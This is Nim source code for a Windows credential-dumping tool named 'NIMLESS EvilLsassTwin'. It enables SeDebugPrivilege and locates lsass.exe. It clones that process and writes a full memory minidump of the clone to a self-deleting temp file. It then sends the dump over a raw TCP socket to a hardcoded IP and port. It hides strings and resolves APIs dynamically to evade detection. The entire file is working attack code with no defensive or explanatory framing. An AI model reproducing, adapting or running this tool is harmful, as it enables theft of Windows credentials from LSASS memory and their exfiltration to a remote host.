import winim
import utils/[stdio, instance, stackstr]
import ptr_math
import std/cstrutils

proc isElevatedProcess(ninst: ptr NIMLESS_INSTANCE): bool =
    let 
      pOpenProcessToken = ninst.Win32.OpenProcessToken
      pGetTokenInformation = ninst.Win32.GetTokenInformation
      pCloseHandle = ninst.Win32.CloseHandle

    var isElevated: bool
    var token: HANDLE

    if pOpenProcessToken(cast[HANDLE](-1), TOKEN_QUERY, addr token) != 0:
        var elevation: TOKEN_ELEVATION
        var token_check: DWORD = cast[DWORD](sizeof TOKEN_ELEVATION)
        if pGetTokenInformation(token, tokenElevation, addr elevation, cast[DWORD](sizeof elevation), addr token_check) != 0:
          isElevated = if elevation.TokenIsElevated != 0: true else: false
    discard pCloseHandle(token)
    return isElevated

proc SetPrivilege(ninst: ptr NIMLESS_INSTANCE, hToken: HANDLE): bool =
  let
    pGetLastError = ninst.Win32.GetLastError
    pLookupPrivilegeValueA = ninst.Win32.LookupPrivilegeValueA
    pAdjustTokenPrivileges = ninst.Win32.AdjustTokenPrivileges
    
  var
    tp: TOKEN_PRIVILEGES
    luid: LUID
    sSEDbg {.stackStringA.} = "SeDebugPrivilege"
  
  if pLookupPrivilegeValueA(NULL, CPTR(sSEDbg), addr luid) == 0:
    PRINTA(ninst, "\n[-] LookupPrivilegeValue Failed with Error: %i".cstring, pGetLastError())
    return true

  tp.PrivilegeCount = 1
  tp.Privileges[0].Luid = luid
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

  PRINTA(ninst, "\n[!] Enabling SeDebugPrivilege...".cstring)
  if pAdjustTokenPrivileges(hToken, cast[WINBOOL](FALSE), addr tp, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), cast[PTOKEN_PRIVILEGES](NULL), cast[PDWORD](NULL)) == 0:
    PRINTA(ninst, "\n[-] AdjustTokenPrivileges Error: %i".cstring, pGetLastError())
    return false

  if pGetLastError() == ERROR_NOT_ALL_ASSIGNED:
    PRINTA(ninst, "\n[-] The token does not have the specified privilege".cstring)
    return false

  return true

proc main() {.exportc: "Main".} =
  var ninst: NIMLESS_INSTANCE
  discard init(ninst)

  PRINTA(ninst.addr, "NIMLESS EvilLsassTwin\n".cstring)
  PRINTA(ninst.addr, " \\__> Size of Instance: %i\n".cstring, sizeof(ninst))
  PRINTA(ninst.addr, " \\__> Size of    Win32: %i\n".cstring, sizeof(ninst.Win32))
  PRINTA(ninst.addr, " \\__> Address of ninst: 0x%p\n".cstring, cast[int](ninst.addr))

  var
    pGetLastError = ninst.Win32.GetLastError
    pLocalAlloc = ninst.Win32.LocalAlloc
    pLocalFree = ninst.Win32.LocalFree
    pOpenProcessToken = ninst.Win32.OpenProcessToken
    pCloseHandle = ninst.Win32.CloseHandle
    pNtGetNextProcess = ninst.Win32.NtGetNextProcess
    pNtCreateProcessEx = ninst.Win32.NtCreateProcessEx
    pQueryFullProcessImageNameA = ninst.Win32.QueryFullProcessImageNameA
    #plstrcmpiA = ninst.Win32.lstrcmpiA
    pPathFindFileNameA = ninst.Win32.PathFindFileNameA
    pGetProcessId = ninst.Win32.GetProcessId
    pCreateFileA = ninst.Win32.CreateFileA
    pTerminateProcess = ninst.Win32.TerminateProcess
    pNtSetInformationFile = ninst.Win32.NtSetInformationFile
    pMiniDumpWriteDump = ninst.Win32.MiniDumpWriteDump
    pGetFileSize = ninst.Win32.GetFileSize
    pCreateFileMappingA = ninst.Win32.CreateFileMappingA
    pMapViewOfFile = ninst.Win32.MapViewOfFile
    pWSAStartup = ninst.Win32.WSAStartup
    pWSASocketA = ninst.Win32.WSASocketA
    pinet_addr = ninst.Win32.inet_addr
    phtons = ninst.Win32.htons
    pconnect = ninst.Win32.connect
    psend = ninst.Win32.send
    pshutdown = ninst.Win32.shutdown

    sUrl: array[11, char]
    sLsass: array[10, char]
    tmpFileName {.stackStringA.} = "twin.txt"
    hToken: HANDLE
    victimHandle: HANDLE
    bufSize: DWORD = MAX_PATH
    status: NTSTATUS
    procOA: OBJECT_ATTRIBUTES
    hClone: HANDLE
    IoStatusBlock: IO_STATUS_BLOCK
    fileDI: FILE_DISPOSITION_INFORMATION
  
  sLsass[0] = 'l'
  sLsass[1] = 's'
  sLsass[2] = 'a'
  sLsass[3] = 's'
  sLsass[4] = 's'
  sLsass[5] = '.'
  sLsass[6] = 'e'
  sLsass[7] = 'x'
  sLsass[8] = 'e'
  sLsass[9] = '\0'

  sUrl[0] = '1'
  sUrl[1] = '0'
  sUrl[2] = '.'
  sUrl[3] = '1'
  sUrl[4] = '.'
  sUrl[5] = '2'
  sUrl[6] = '.'
  sUrl[7] = '1'
  sUrl[8] = '0'
  sUrl[9] = '9'
  sUrl[10] = '\0'

  fileDI.DoDeleteFile = TRUE
  InitializeObjectAttributes(addr procOA, NULL, 0, cast[HANDLE](NULL), NULL)
   
  var procName = cast[ptr CHAR](pLocalAlloc(LMEM_FIXED, MAX_PATH))
  if cast[uint](procName) == 0:
    PRINTA(ninst.addr, "[-] LA Failed with Error Code %i\n".cstring, pGetLastError())
    ninst.Win32.ExitProcess(1)
 
  var 
    pid: DWORD
    count: int = 1
  
  if isElevatedProcess(ninst.addr):
    PRINTA(ninst.addr, "\n[+] Process Running Elevated!\n".cstring)
  else:
    PRINTA(ninst.addr, "\n[-] Process Not Running Elevated!\n[!] Quitting...".cstring)
    ninst.Win32.ExitProcess(1)

  if (pOpenProcessToken(cast[HANDLE](-1), TOKEN_ADJUST_PRIVILEGES, addr hToken) != 0) and (SetPrivilege(ninst.addr, hToken) != 0):
    PRINTA(ninst.addr, "\n[+] Debug Privilege Enabled!\n".cstring)
    discard pCloseHandle(hToken)
  else:
    PRINTA(ninst.addr, "\n[-] Failed to Enable SeDebugPrivilege\n[!] Quitting...".cstring)
    ninst.Win32.ExitProcess(1)

  #PRINTA(ninst.addr, "\nvictimHandle Address: 0x%p".cstring, victimHandle.addr)
  while pNtGetNextProcess(victimHandle, MAXIMUM_ALLOWED, 0, 0, addr victimHandle) == 0:
    zeroMem(procName, MAX_PATH)
    PRINTA(ninst.addr, "\nLoop Count: %i".cstring, count)
    PRINTA(ninst.addr, "\n[!] Obtained Handle Value: 0x%i".cstring, victimHandle)
    
    if pQueryFullProcessImageNameA(victimHandle, 0, procName, bufSize.addr) == 0:
    #if pGetProcessImageFileNameA(victimHandle, cast[LPSTR](procName), MAX_PATH) == 0:
      #PRINTA(ninst.addr, "\n[!] procName Address: 0x%i", procName)
      PRINTA(ninst.addr, "\n[-] QFPINA Failed with Error: %i\n[!] Quitting...".cstring, pGetLastError())
      discard pCloseHandle(victimHandle)
      discard pLocalFree(cast[HLOCAL](procName))
      ninst.Win32.ExitProcess(1)    

    PRINTA(ninst.addr, "\n[!] QueryFullProcessImageNameA Wrote %i Bytes to Buffer!".cstring, bufSize)
    PRINTA(ninst.addr, "\n[!] PID: %i".cstring, pGetProcessId(victimHandle))
    PRINTA(ninst.addr, "\n[!] Process Name: %s\n".cstring, pPathFindFileNameA(procName))
    bufSize = MAX_PATH
    
    #if plstrcmpiA("lsass.exe".cstring, pPathFindFileNameA(procName)) == 0:
    if cmpIgnoreCase(cast[cstring](sLsass[0].addr), cast[cstring](pPathFindFileNameA(procName))) == 0:
      pid = pGetProcessId(victimHandle)
      PRINTA(ninst.addr, cast[cstring]("\n[+] Found PID %i and Obtained Handle 0x%i\n"), pid, victimHandle)
      break
    
    count += 1

  if victimHandle == 0:
    PRINTA(ninst.addr, "[-] Failed to Obtain Handle to Process! Error: %i\n[!] Quitting...", pGetLastError())
    ninst.Win32.ExitProcess(1)

  PRINTA(ninst.addr, "\n[!] Cloning Process...".cstring)
  status = pNtCreateProcessEx(addr hClone, PROCESS_ALL_ACCESS, addr procOA, victimHandle, cast[ULONG](0), cast[HANDLE](NULL), cast[HANDLE](NULL), cast[HANDLE](NULL), FALSE)
  if NT_SUCCESS(status):
      PRINTA(ninst.addr, "\n[+] Successfully Cloned to New PID: %i\n".cstring, pGetProcessId(hClone))
  else:
      PRINTA(ninst.addr, "\n[-] Failed to Clone Process! Error: %i\n[!] Quitting...".cstring, status)
      ninst.Win32.ExitProcess(1)

  PRINTA(ninst.addr, "\n[!] Creating Temporary File and Marking as Delete On Close...".cstring)
  var hOutFile = pCreateFileA(CPTR(tmpFileName), GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, cast[HANDLE](NULL))
  
  if hOutFile == INVALID_HANDLE_VALUE:
      PRINTA(ninst.addr, "\n[-] Dump File Could Not Be Created In Current Directory! Error: %i\n[!] Quitting...".cstring, pGetLastError())
      discard pTerminateProcess(hClone, 0)
      discard pCloseHandle(victimHandle)
      discard pCloseHandle(hOutFile)
      ninst.Win32.ExitProcess(1)
  
  status = pNtSetInformationFile(hOutFile, addr IoStatusBlock, addr fileDI, cast[ULONG](sizeof(fileDI)), 13)
    
  if NT_SUCCESS(status) == false:
    PRINTA(ninst.addr, "\n[-] Could Not Mark File as Delete on Close! Error: %i\n[!] Quitting...".cstring, status)
    ninst.Win32.ExitProcess(1)

  var miniDump = pMiniDumpWriteDump(hClone, 0, hOutFile, miniDumpWithFullMemory or miniDumpIgnoreInaccessibleMemory, NULL, NULL, NULL)
  
  if miniDump == TRUE:
    PRINTA(ninst.addr, "\n[+] Sucessfully Dumped Evil Twin!\n".cstring)
    discard pTerminateProcess(hClone, 0)
  else:
    PRINTA(ninst.addr, "\n[-] Could Not Dump Clone! Error: %i\n[!] Quitting...".cstring, pGetLastError())
    discard pTerminateProcess(hClone, 0)
    discard pCloseHandle(hOutFile)

  var size: DWORD = pGetFileSize(hOutFile, NULL)
  var hMapping: HANDLE = pCreateFileMappingA(hOutFile, NULL, PAGE_READONLY, 0, 0, NULL)
  var pMappedData = pMapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0)
  var pMappedDataCurrent = pMappedData
  var bytesSent: int = 0

  PRINTA(ninst.addr, "\n[!] Mapped Data at: 0x%p - Size: %i bytes".cstring, pMappedData, size)
  
  PRINTA(ninst.addr, "\n[!] Sending Data to Server...".cstring)

  var wsaData: WSADATA
  discard pWSAStartup(MAKEWORD(2,2), addr wsaData)

  var socket = pWSASocketA(2, 1, 6, NULL, cast[GROUP](0), cast[DWORD](NULL))
  var sa: sockaddr_in
  
  sa.sin_family = AF_INET
  sa.sinaddr.S_addr = pinet_addr(sUrl[0].addr)
  sa.sin_port = phtons(9001)

  discard pconnect(socket, cast[ptr sockaddr](sa.addr), cast[int32](sizeof(sa)))

  while bytesSent < size:
    var bytesToSend: int = 0
    if (size - bytesSent) < 4096:
      bytesToSend = psend(socket, cast[ptr char](pMappedDataCurrent), 2048, 0)
      bytesSent += 2048
      pMappedDataCurrent += 2048
    elif (size - bytesSent) < 2048:
      bytesToSend = psend(socket, cast[ptr char](pMappedDataCurrent), cast[int32](size - bytesSent), 0)
      bytesSent += (size - bytesSent)
      pMappedDataCurrent += (size - bytesSent)
    else:
      bytesToSend = psend(socket, cast[ptr char](pMappedDataCurrent), 4096, 0)
      bytesSent += 4096
      pMappedDataCurrent += 4096
    
    if bytesToSend == SOCKET_ERROR:
      PRINTA(ninst.addr, "\n[-] Error Sending Dump Data! File May Be Corrupted!".cstring)

  discard pshutdown(socket, SD_SEND)

  PRINTA(ninst.addr, "\n[+] Successfully Sent %i Bytes to Server!".cstring, bytesSent)
  ninst.Win32.ExitProcess(0)

{.passC:"-masm=intel".}
proc start() {.asmNoStackframe, codegenDecl: "__attribute__((section (\".text\"))) $# $#$#", exportc: "start".} =
  asm """
    and rsp, 0xfffffffffffffff0
    sub rsp, 0x10
    call Main
    add rsp, 0x10
    ret
  """

when isMainModule:
  start()
